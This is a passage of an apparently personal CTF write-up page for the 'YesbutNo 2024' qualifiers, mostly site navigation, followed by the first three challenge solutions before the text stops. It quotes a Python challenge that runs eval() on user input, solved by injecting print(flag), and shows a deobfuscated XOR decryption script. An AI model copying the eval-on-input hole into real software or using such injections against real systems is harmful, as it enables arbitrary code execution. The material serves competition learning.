
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../Whitehacks%202025%20Writeups/">
      
      
        <link rel="next" href="../../Dated%20blogs/03-02-2024/">
      
      
        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../feed_rss_created.xml">
        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../feed_rss_updated.xml">
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.10">
    
    
      
        <title>YesbutNo 2024 Qual Writeups - obsidian-mkdocs template</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.4af4bdda.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="pink" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#hero-1" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="obsidian-mkdocs template" class="md-header__button md-logo" aria-label="obsidian-mkdocs template" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            obsidian-mkdocs template
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              YesbutNo 2024 Qual Writeups
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="pink" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="pink" data-md-color-accent="blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="obsidian-mkdocs template" class="md-nav__button md-logo" aria-label="obsidian-mkdocs template" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    obsidian-mkdocs template
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Welcome!
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Achievements/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Achievements
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Blogs/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Blogs
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../SDL/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    SDL
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
        
          
          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Ctfs
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_5">
            <span class="md-nav__icon md-icon"></span>
            Ctfs
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Blahaj%202024%20Quals%20%2B%20Finals%20writeups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Blahaj 2024 Quals + Finals writeups
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../CSaw%202024%20Qualifier%20writeups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Lost pyramid
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Cddc%202024%20qualifier%20writeups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Cddc 2024 qualifier writeups
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Cyberthon%202024%20writeups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    One Click 🤑 One Dollar
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Hack%20the%20vote%202024%20writeups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Poll vault
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Hkctf%202024%20writeups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    New free lunch
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Iris%20ctf%202025%20Writeup/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Iris ctf 2025 Writeup
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Platypwn%202024%20Writeups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Platypwn 2024 Writeups
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Sekai%20Ctf%202024%20writeups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Sekai Ctf 2024 writeups
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Whitehacks%202025%20Writeups/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Travel back to a time gone by
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    YesbutNo 2024 Qual Writeups
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    YesbutNo 2024 Qual Writeups
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#hero-1" class="md-nav__link">
    <span class="md-ellipsis">
      Hero 1
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#inspector-who" class="md-nav__link">
    <span class="md-ellipsis">
      Inspector who
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dont-look-at-me" class="md-nav__link">
    <span class="md-ellipsis">
      Don't look at me!
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web-web-web" class="md-nav__link">
    <span class="md-ellipsis">
      Web web web
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#simple-website" class="md-nav__link">
    <span class="md-ellipsis">
      Simple website
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stationary-threat" class="md-nav__link">
    <span class="md-ellipsis">
      Stationary threat
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#number-oracle" class="md-nav__link">
    <span class="md-ellipsis">
      Number oracle
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#more-kaboommmmm" class="md-nav__link">
    <span class="md-ellipsis">
      MORE KABOOMMMMM
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#cool-math-games" class="md-nav__link">
    <span class="md-ellipsis">
      Cool math games
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#memory-sim" class="md-nav__link">
    <span class="md-ellipsis">
      Memory sim
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#view-source-revenge" class="md-nav__link">
    <span class="md-ellipsis">
      View source revenge
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#nobutyes" class="md-nav__link">
    <span class="md-ellipsis">
      NoButYes
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#needle-in-a-haystack" class="md-nav__link">
    <span class="md-ellipsis">
      Needle in a haystack
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#post-ctf-lessons" class="md-nav__link">
    <span class="md-ellipsis">
      Post ctf lessons
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Post ctf lessons">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#essay-evaluator" class="md-nav__link">
    <span class="md-ellipsis">
      Essay evaluator
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rentahitman-1" class="md-nav__link">
    <span class="md-ellipsis">
      RentAHitman 1
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rentahitman-2" class="md-nav__link">
    <span class="md-ellipsis">
      RentAHitman 2
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
        
          
          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Dated blogs
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_6">
            <span class="md-nav__icon md-icon"></span>
            Dated blogs
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Dated%20blogs/03-02-2024/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    03 02 2024
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
        
          
          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Assets
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_7">
            <span class="md-nav__icon md-icon"></span>
            Assets
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../assets/TeXnically_Insecure_author_writeup/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    TeXnically Insecure
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
        
          
          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    Blog
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_8">
            <span class="md-nav__icon md-icon"></span>
            Blog
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
    
  
  
    <li class="md-nav__item">
      <a href="../../blog/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Blog
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Archive
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#hero-1" class="md-nav__link">
    <span class="md-ellipsis">
      Hero 1
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#inspector-who" class="md-nav__link">
    <span class="md-ellipsis">
      Inspector who
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#dont-look-at-me" class="md-nav__link">
    <span class="md-ellipsis">
      Don't look at me!
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web-web-web" class="md-nav__link">
    <span class="md-ellipsis">
      Web web web
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#simple-website" class="md-nav__link">
    <span class="md-ellipsis">
      Simple website
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#stationary-threat" class="md-nav__link">
    <span class="md-ellipsis">
      Stationary threat
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#number-oracle" class="md-nav__link">
    <span class="md-ellipsis">
      Number oracle
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#more-kaboommmmm" class="md-nav__link">
    <span class="md-ellipsis">
      MORE KABOOMMMMM
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#cool-math-games" class="md-nav__link">
    <span class="md-ellipsis">
      Cool math games
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#memory-sim" class="md-nav__link">
    <span class="md-ellipsis">
      Memory sim
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#view-source-revenge" class="md-nav__link">
    <span class="md-ellipsis">
      View source revenge
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#nobutyes" class="md-nav__link">
    <span class="md-ellipsis">
      NoButYes
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#needle-in-a-haystack" class="md-nav__link">
    <span class="md-ellipsis">
      Needle in a haystack
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#post-ctf-lessons" class="md-nav__link">
    <span class="md-ellipsis">
      Post ctf lessons
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Post ctf lessons">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#essay-evaluator" class="md-nav__link">
    <span class="md-ellipsis">
      Essay evaluator
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rentahitman-1" class="md-nav__link">
    <span class="md-ellipsis">
      RentAHitman 1
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rentahitman-2" class="md-nav__link">
    <span class="md-ellipsis">
      RentAHitman 2
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



<p>We managed to get 14th place out of 123 with 21632 points but sadly did not qualify. Challenges roughly ordered by how hard I felt they were.
Solves:  Hero 1(crypto?), Inspector Who(web), Don't Look At Me!!!(web), Web web web(web), Simple website(web), Stationary threat(web), Number oracle(web), MORE KABOOMMMMM(web), cool math games(crypto), Memory sim(pwn), View source revenge(web), NoButYes(web), Needle in a haystack(pwn)</p>
<h2 id="hero-1">Hero 1<a class="headerlink" href="#hero-1" title="Permanent link">&para;</a></h2>
<p>This wasn't really a cryto challenge.
<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Util.number</span><span class="w"> </span><span class="kn">import</span> <span class="n">getPrime</span><span class="p">,</span> <span class="n">bytes_to_long</span>

<span class="n">flag</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;YBN24{????????????????????????}&quot;</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
<span class="n">q</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
<span class="n">y</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
<span class="n">e</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>
<span class="n">c</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>


<span class="k">try</span><span class="p">:</span>
    <span class="n">a</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&quot;a: &quot;</span><span class="p">)))</span>
    <span class="n">b</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&quot;b: &quot;</span><span class="p">)))</span>

    <span class="k">assert</span> <span class="n">a</span> <span class="o">&gt;</span> <span class="mi">0</span>
<span class="k">except</span><span class="p">:</span>
    <span class="n">quit</span><span class="p">()</span>


<span class="n">g</span> <span class="o">=</span> <span class="n">q</span> <span class="o">*</span> <span class="n">e</span>
<span class="n">n</span> <span class="o">=</span> <span class="p">((</span><span class="n">a</span><span class="p">)</span> <span class="o">**</span> <span class="p">(</span><span class="n">b</span> <span class="o">+</span> <span class="n">c</span><span class="p">))</span> <span class="o">*</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span> <span class="o">*</span> <span class="n">y</span>

<span class="n">enc</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="n">flag</span><span class="p">),</span> <span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>

<span class="n">ct</span> <span class="o">=</span> <span class="n">enc</span> <span class="o">*</span> <span class="n">y</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;g = </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">g</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;n = </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;ct = </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ct</span><span class="p">))</span>
</code></pre></div>
For some reason, the inputs a and b are directly evaluated, so we can simple submit <code>print(flag)</code> as the input and we will get the flag.
<code>YBN24{RS4_mu1t!prim3_f4ct0r1ng}</code></p>
<h2 id="inspector-who">Inspector who<a class="headerlink" href="#inspector-who" title="Permanent link">&para;</a></h2>
<p>"Hey I came across this website displaying a 3D model of the TARDIS! I wonder what I can find from INSPECTING this site..."
By using the power of inspect element, we find the flag
<img alt="Pasted image 20241201110933.png" src="../../assets/Pasted%20image%2020241201110933.png" />
<code>YBN24{1_l0v3_1n5p3ct_3l3m3nt}</code></p>
<h2 id="dont-look-at-me">Don't look at me!<a class="headerlink" href="#dont-look-at-me" title="Permanent link">&para;</a></h2>
<p>Once again with the power of inspect element, we see that a script <code>decrypt.js</code> is being loaded
<img alt="Pasted image 20241201111141.png" src="../../assets/Pasted%20image%2020241201111141.png" />It seems the script is obfuscated so we throw it into a js deobfuscator.
<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">_0x3ca409</span><span class="p">(</span><span class="nx">_0x50cea5</span><span class="p">,</span><span class="w"> </span><span class="nx">_0x1e126b</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">let</span><span class="w"> </span><span class="nx">_0xdce022</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="w">  </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">_0x2eb5b4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">_0x2eb5b4</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">_0x50cea5</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">_0x2eb5b4</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">_0x128b0a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_0x50cea5</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">_0x2eb5b4</span><span class="p">)</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="nx">_0x1e126b</span><span class="p">.</span><span class="nx">charCodeAt</span><span class="p">(</span><span class="nx">_0x2eb5b4</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="nx">_0x1e126b</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_0x128b0a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_0x128b0a</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="mf">7</span><span class="p">;</span>
<span class="w">    </span><span class="nx">_0xdce022</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nx">_0x128b0a</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">_0xdce022</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">_0x1dc557</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">_0x5f3d96</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="s2">&quot;encryptedFlag.txt&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">_0x5f3d96</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>
<span class="p">}</span>
